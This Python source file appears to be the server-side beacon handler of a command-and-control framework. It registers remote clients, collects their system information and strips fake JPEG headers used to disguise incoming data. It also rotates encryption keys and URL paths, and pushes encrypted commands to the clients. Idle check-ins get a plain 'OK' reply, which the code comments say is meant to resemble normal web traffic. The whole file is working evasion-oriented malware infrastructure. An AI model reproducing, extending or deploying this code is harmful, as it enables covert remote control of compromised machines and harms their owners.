import logging
import json
import base64
import re

logger = logging.getLogger(__name__)

from handlers.base_handler import BaseHandler

class BeaconHandler(BaseHandler):
    """Handler for beacon requests from clients"""
    
    def handle(self, include_rotation_info=False):
        """
        Process a beacon request from a client
        
        Args:
            include_rotation_info: Whether to include path rotation information
        """
        self.log_message(f"Beacon received from {self.client_address[0]}")
        
        try:
            # Read content data - now client info is in the request body
            content_length = int(self.headers.get('Content-Length', 0))
            if content_length == 0:
                self.send_error_response(400, "Missing content")
                return
                
            request_body = self.request_handler.rfile.read(content_length).decode('utf-8')
            
            # Parse the JSON body
            try:
                body_data = json.loads(request_body)
                client_id = body_data.get('client_id')
                system_info_raw = body_data.get('data')
                rotation_id = body_data.get('rotation_id')
                
                # Process JPEG headers if present in either binary or text form
                if system_info_raw and isinstance(system_info_raw, str):
                    try:
                        # Try to decode base64 to check for binary JPEG header
                        try:
                            decoded_data = base64.b64decode(system_info_raw)
                            # Check for JPEG header bytes (0xFF 0xD8 0xFF)
                            if len(decoded_data) > 3 and decoded_data[0] == 0xFF and decoded_data[1] == 0xD8 and decoded_data[2] == 0xFF:
                                # Remove the JPEG header (first 3 bytes)
                                decoded_data = decoded_data[3:]
                                self.log_message(f"Removed binary JPEG header from data")
                                
                                # Re-encode to base64 for decryption
                                system_info_raw = base64.b64encode(decoded_data).decode('utf-8')
                        except Exception as e:
                            # If it's not valid base64 or has no header, continue with text checks
                            self.log_message(f"Not a valid base64 with binary JPEG header: {str(e)}")
                            
                        # Text-based header checks as fallback
                        if system_info_raw.startswith("0xFFD8FF"):
                            system_info_raw = system_info_raw[8:]  # Remove the exact 8 characters
                            self.log_message(f"Removed text JPEG header '0xFFD8FF' from data")
                        elif system_info_raw.startswith("FFD8FF"):
                            system_info_raw = system_info_raw[6:]  # Remove the exact 6 characters
                            self.log_message(f"Removed text JPEG header 'FFD8FF' from data")
                    except Exception as e:
                        self.log_message(f"Error processing potential JPEG headers: {str(e)}")
                    
                # Log the received client ID to verify
                self.log_message(f"Client ID from request body: {client_id}")
            except json.JSONDecodeError:
                self.send_error_response(400, "Invalid JSON format")
                return
            
            # Identify the client using the data from request body
            client_id, system_info, newly_identified, first_contact = self.client_helper.identify_client_from_body(
                self.client_address[0], 
                client_id,
                system_info_raw
            )
            
            # Log the beacon
            self.log_message(f"Identified client {client_id} ({system_info.get('Hostname', 'Unknown')}){' - FIRST CONTACT' if first_contact else ''}")
            
            # Verify client if system info is available and not first contact
            needs_key_rotation = False
            if system_info and not first_contact:
                _, _, needs_key_rotation, _ = self.client_helper.verify_client(client_id, system_info)
            
            # Organize commands for the client
            commands, has_key_operation = self.client_helper.organize_commands(
                client_id, 
                include_key_rotation=needs_key_rotation,
                first_contact=first_contact
            )
            
            # Add path rotation command if needed for established clients
            if include_rotation_info and not first_contact:
                path_rotation_command = self.path_router.create_path_rotation_command()
                commands.append(path_rotation_command)
                self.log_message(f"Sending path rotation info to client {client_id}")
            
            # Log commands being sent
            for command in commands:
                cmd_type = command['command_type']
                args = command['args'] if cmd_type not in ['key_rotation', 'key_issuance'] else '[REDACTED KEY]'
                self.client_manager.log_event(client_id, "Command sent", f"Type: {cmd_type}, Args: {args}")
            
            # Get the current client ID for responding
            current_client_id = self.client_manager.get_current_client_id(client_id)
            if current_client_id != client_id:
                self.log_message(f"Using current client ID {current_client_id} for response to {client_id}")
            
            # Send response to client
            self._send_beacon_response(client_id, current_client_id, commands, has_key_operation, first_contact, include_rotation_info)
            
            # Clear key rotation commands after delivery
            if has_key_operation and not first_contact:
                self.client_helper.clear_commands_after_rotation(client_id)
                
        except Exception as e:
            logger.error(f"Error handling beacon: {str(e)}")
            self.send_error_response(500, "Internal server error")
    
    def _send_beacon_response(self, client_id, current_client_id, commands, has_key_operation, first_contact, include_rotation_info):
        """Send the response to the client beacon"""
        # For first contact or key operations, we need to send more detailed information
        if first_contact or has_key_operation or include_rotation_info or commands:
            # Prepare response data
            response_data = {
                "commands": commands,
                "first_contact": first_contact,
                "encrypted": False
            }
            
            # Add key operation flags only if needed
            if has_key_operation:
                if first_contact:
                    response_data["key_issuance"] = True
                else:
                    response_data["key_rotation"] = True
            
            # Add path rotation info if requested
            if include_rotation_info:
                rotation_info = self.path_router.get_rotation_info()
                response_data["rotation_info"] = rotation_info
            else:
                # Only include minimal rotation info if needed
                rotation_info = {
                    "current_rotation_id": self.path_router.path_manager.rotation_counter,
                    "next_rotation_time": self.path_router.path_manager.get_next_rotation_time()
                }
                response_data["rotation_info"] = rotation_info
            
            # For established clients with encryption, encrypt the commands
            if not first_contact and commands:
                # Convert commands to JSON string for encryption
                commands_json = json.dumps(commands)
                
                # Encrypt the commands - use the original client ID for encryption key
                encrypted_commands = self.crypto_helper.encrypt(commands_json, client_id)
                
                # Replace commands with encrypted version
                response_data["commands"] = encrypted_commands
                response_data["encrypted"] = True
            
            # Send the response as JSON
            self.send_response(200, "application/json", json.dumps(response_data))
        else:
            # For regular check-ins with no commands, just send a simple "OK" response
            # This looks more like normal web traffic
            self.send_response(200, "text/plain", "OK")